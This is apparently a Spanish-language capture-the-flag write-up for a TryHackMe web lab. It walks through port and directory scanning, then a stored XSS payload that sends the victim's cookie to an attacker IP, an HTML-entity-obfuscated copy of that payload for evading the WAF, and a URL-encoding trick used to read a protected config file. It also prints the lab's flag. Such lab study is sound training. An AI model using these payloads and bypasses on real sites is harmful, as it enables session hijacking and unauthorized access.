---
title: "Padelify"
platform: "TryHackMe"
os: "Linux"
difficulty: "Hard"
ip: "10.10.10.XXX"
slug: "padelify"
author: "Z4k7"
date: "2026-03-14"
year: "2026"
status: "pwned"
tags:
  - "XSS"
  - "Cookie"
  - "HttpOnly"
  - "WAF"
  - "LFI"
techniques:
  - "XSS"
  - "Cookie"
  - "HttpOnly"
  - "WAF"
  - "LFI"
tools:
  - "Nmap"
  - "Fuff"
  - "feroxbuster"
  - "python"
flags_list:
  - label: "Flag"
    value: "THM{Logged_1n_Adm1n001}"
summary: "Evacion del WAF"
steps:

  - id: "exploit"
    num: "01"
    title: "Objetivo"
    content:
      - kind: "note"
        text: |
          Te has inscrito en el Campeonato de Pádel, pero tu rival sigue escalando puestos en la clasificación. El panel de administración controla las aprobaciones y registros de los partidos. ¿Podrás descifrar la administración y reescribir el sorteo antes del pitido inicial?

  - id: "recon"
    num: "02"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Validamos si contamos con conexión a la ip por medio de un `ping`
      - kind: "code"
        lang: "BASH"
        code: |
          ping -c 6 10.65.188.120
          PING 10.65.188.120 (10.65.188.120) 56(84) bytes of data.
          64 bytes from 10.65.188.120: icmp_seq=1 ttl=62 time=74.7 ms
          64 bytes from 10.65.188.120: icmp_seq=2 ttl=62 time=79.9 ms
          64 bytes from 10.65.188.120: icmp_seq=3 ttl=62 time=82.7 ms
          64 bytes from 10.65.188.120: icmp_seq=4 ttl=62 time=78.6 ms
          64 bytes from 10.65.188.120: icmp_seq=5 ttl=62 time=76.0 ms
          64 bytes from 10.65.188.120: icmp_seq=6 ttl=62 time=76.3 ms
          
          --- 10.65.188.120 ping statistics ---
          6 packets transmitted, 6 received, 0% packet loss, time 5040ms
          rtt min/avg/max/mdev = 74.700/78.054/82.726/2.713 ms
      - kind: "note"
        text: |
          Se recomienda aplicar el name para la ip asignada el name del dominio de la ip se encuentra en el objetivo del laboratorio
      - kind: "code"
        lang: "BASH"
        code: |
          echo "10.65.188.120 padelify.thm" |sudo  tee -a /etc/hosts
          [sudo] password for kali: 
          10.65.188.120 padelify.thm
      - kind: "note"
        text: |
          Se valida ya contamos con el hosts de la ip a si podemos interactuar mejor con el entorno , consultamos si contamos con el acceso desde el navegador  con el  nombre del dominio creado
      - kind: "image"
        src: "assets/images/Padelify/file-20260313192519868.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Iniciamos con un escaneo completo de puertos para identificar servicios expuestos en la máquina objetivo.
      - kind: "code"
        lang: "BASH"
        code: |
          nmap -sVC -O -T4 -v padelify.thm
          
          PORT   STATE SERVICE VERSION
          22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
          | ssh-hostkey: 
          |   256 37:75:ca:4c:62:aa:19:b9:82:f2:a6:7b:c3:a0:d3:63 (ECDSA)
          |_  256 eb:e4:c2:c0:8a:f6:c0:cf:74:66:07:2c:ef:98:c8:90 (ED25519)
          80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
          | http-methods: 
          |_  Supported Methods: GET HEAD POST OPTIONS
          |_http-title: Padelify - Tournament Registration
          |_http-server-header: Apache/2.4.58 (Ubuntu)
          | http-cookie-flags: 
          |   /: 
          |     PHPSESSID: 
          |_      httponly flag not set
          No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
          TCP/IP fingerprint:
      - kind: "bullet"
        text: "Puerto 80 http    Apache httpd 2.4.58 ((Ubuntu))"
      - kind: "bullet"
        text: "Puerto 22  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)"
      - kind: "note"
        text: |
          Validando la información es considerable la parte que menciona la web  `|     PHPSESSID:`
          `|_      httponly flag not set`

  - id: "enum"
    num: "03"
    title: "Enumeración"
    content:
      - kind: "note"
        text: |
          Entramos a validar si el dominio puede contar con directorios o subdominios que nos validar alguna información adicional de lo encontrado.
      - kind: "code"
        lang: "R"
        code: |
          feroxbuster -u http://padelify.thm/  -H "User-Agent: Mozilla/5.0" 
          ___  ___  __   __     __      __         __   ___
          |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
          |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
          by Ben "epi" Risher 🤓                 ver: 2.13.1
          ───────────────────────────┬──────────────────────
           🎯  Target Url            │ http://padelify.thm/
           🚩  In-Scope Url          │ padelify.thm
           🚀  Threads               │ 50
           📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
           👌  Status Codes          │ All Status Codes!
           💥  Timeout (secs)        │ 7
           🦡  User-Agent            │ feroxbuster/2.13.1
           💉  Config File           │ /etc/feroxbuster/ferox-config.toml
           🤯  Header                │ User-Agent: Mozilla/5.0
           🔎  Extract Links         │ true
           🏁  HTTP methods          │ [GET]
           🔃  Recursion Depth       │ 4
          ───────────────────────────┴──────────────────────
           🏁  Press [ENTER] to use the Scan Management Menu™
          ──────────────────────────────────────────────────
          403      GET      116l      332w     2872c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
          404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
          301      GET        9l       28w      309c http://padelify.thm/js => http://padelify.thm/js/
          301      GET        9l       28w      310c http://padelify.thm/css => http://padelify.thm/css/
          301      GET        9l       28w      311c http://padelify.thm/logs => http://padelify.thm/logs/
          302      GET        0l        0w        0c http://padelify.thm/register.php => index.php
          200      GET       35l       76w     1124c http://padelify.thm/login.php
          301      GET        9l       28w      313c http://padelify.thm/config => http://padelify.thm/config/
          200      GET        9l      134w     1076c http://padelify.thm/logs/error.log
          301      GET        9l       28w      317c http://padelify.thm/javascript => http://padelify.thm/javascript/
          200      GET        7l     1207w    80663c http://padelify.thm/js/bootstrap.bundle.min.js
          200      GET        6l     2256w   232948c http://padelify.thm/css/bootstrap.min.css
          200      GET       95l      253w     3853c http://padelify.thm/
          301      GET        9l       28w      324c http://padelify.thm/javascript/jquery => http://padelify.thm/javascript/jquery/
          200      GET    10907l    44549w   289782c http://padelify.thm/javascript/jquery/jquery
      - kind: "note"
        text: |
          Validamos con otra herramienta para tratar de obtener otros directorios
      - kind: "code"
        lang: "D"
        code: |
          ffuf -u http://padelify.thm/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -H "User-Agent: Mozilla/5.0"  
          
                  /'___\  /'___\           /'___\       
                 /\ \__/ /\ \__/  __  __  /\ \__/       
                 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
                  \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
                   \ \_\   \ \_\  \ \____/  \ \_\       
                    \/_/    \/_/   \/___/    \/_/       
          
                 v2.1.0-dev
          ________________________________________________
          
           :: Method           : GET
           :: URL              : http://padelify.thm/FUZZ
           :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
           :: Header           : User-Agent: Mozilla/5.0
           :: Follow redirects : false
           :: Calibration      : false
           :: Timeout          : 10
           :: Threads          : 40
           :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
          ________________________________________________
          
          css                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 83ms]
          js                      [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 85ms]
          logs                    [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 85ms]
          config                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 84ms]
          javascript              [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 78ms]
          server-status           [Status: 403, Size: 2872, Words: 572, Lines: 117, Duration: 76ms]
          :: Progress: [26583/26583] :: Job [1/1] :: 425 req/sec :: Duration: [0:00:55] :: Errors: 1 ::
      - kind: "note"
        text: |
          Verificando los directorios encontramos en el apartado de `http://padelify.thm/config/app.conf`
          este directorio esta protegido por parte del #WAF  nos salta el bloqueo
      - kind: "image"
        src: "assets/images/Padelify/file-20260313204216817.jpg"
        caption: "WAF"
      - kind: "note"
        text: |
          En los demás directorios encontramos información pero no es relevante ,Consultamos el apartado de la interfaz del usuario donde nos permite enviar un registro al sistema pendiente de aprobación por parte de usuario con perfil de admisión.
      - kind: "image"
        src: "assets/images/Padelify/file-20260313204508213.jpg"
        caption: "Reistro"
      - kind: "note"
        text: |
          Si entramos a validar se envía un registro consultando en el navegador evidenciamos que la parte de `HttpOnly`  se evidencia que es posible obtener la cookie por medio de la cabecera en este caso podríamos tomar la cookie por medio de una inyección #XSS-Almacenada
          En este caso o pondremos en modo escucha por el puerto 8989
      - kind: "code"
        lang: "PYTHON"
        code: |
          python3 -m http.server 8989
          Serving HTTP on 0.0.0.0 port 8989 (http://0.0.0.0:8989/) ...
      - kind: "note"
        text: |
          Aplicamos el siguiente script para captura la cookie del usuario victima
      - kind: "code"
        lang: "BASH"
        code: |
          <script>
          fetch(fetch('http://192.168.132.130:9090/?'+document.cookie))
          </script>
      - kind: "note"
        text: |
          Se envía el formulario con el script anterior y nos salta el WAF
      - kind: "image"
        src: "assets/images/Padelify/file-20260313205418153.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          En este caso tratamos de ofuscar el código para tratar de saltar el WAF
      - kind: "code"
        lang: "JS"
        code: |
          &lt;&#98;&#111;&#100;&#121;&#32;&#111;&#110;&#108;&#111;&#97;&#100;&equals;&#102;&#101;&#116;&#99;&#104;&lpar;&apos;&#104;&#116;&#116;&#112;&colon;&sol;&sol;&#49;&#57;&#50;&period;&#49;&#54;&#56;&period;&#49;&#51;&#50;&period;&#49;&#51;&#48;&colon;&#57;&#48;&#57;&#48;&quest;&apos;&plus;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&period;&#99;&#111;&#111;&#107;&#105;&#101;&rpar;&gt;
      - kind: "note"
        text: |
          Capturamos la cookie de la victima
      - kind: "image"
        src: "assets/images/Padelify/file-20260314124441676.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Luego de ingresas la cookie ya contamos  con el usuario moderador que acepta  los nuevos registros
      - kind: "image"
        src: "assets/images/Padelify/file-20260314124737599.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Validamos los directorios disponibles podemos  consultar que contamos con un directorio llamado Live
      - kind: "image"
        src: "assets/images/Padelify/file-20260314124833608.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Validando los directorio podemos intentar aplicar un  de #LFI para tratar de acceder al servidor de la web
          Intentamos aplicar  `../../../../../etc/passwd`  validamos pero no es posible por mas que se aplique directorios nos salta el WAF ,Consultando los directorios anteriores recordamos  un directorio  llamado  `config/app.conf`  tratamos de ingresar a dicho directorio no es posible ingresar nos salta en automático el WAF
      - kind: "image"
        src: "assets/images/Padelify/file-20260314125404333.jpg"
        caption: "WAF"
      - kind: "note"
        text: |
          Si tratamos de enviar ese directorio pero por medio de URL encode `config%2Fapp%2Econf`
      - kind: "image"
        src: "assets/images/Padelify/file-20260314125749963.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Contamos con información relevante para acceder en la cuenta administrador
      - kind: "image"
        src: "assets/images/Padelify/file-20260314125941671.jpg"
        caption: "Evidencia técnica"

  - id: "flag_01"
    type: "flag"
    flag_items:
      - label: "Flag"
        value: "THM{Logged_1n_Adm1n001}"

lessons:
  - "Completar lecciones aprendidas"
mitigation: 'Completar mitigaciones recomendadas.'
---
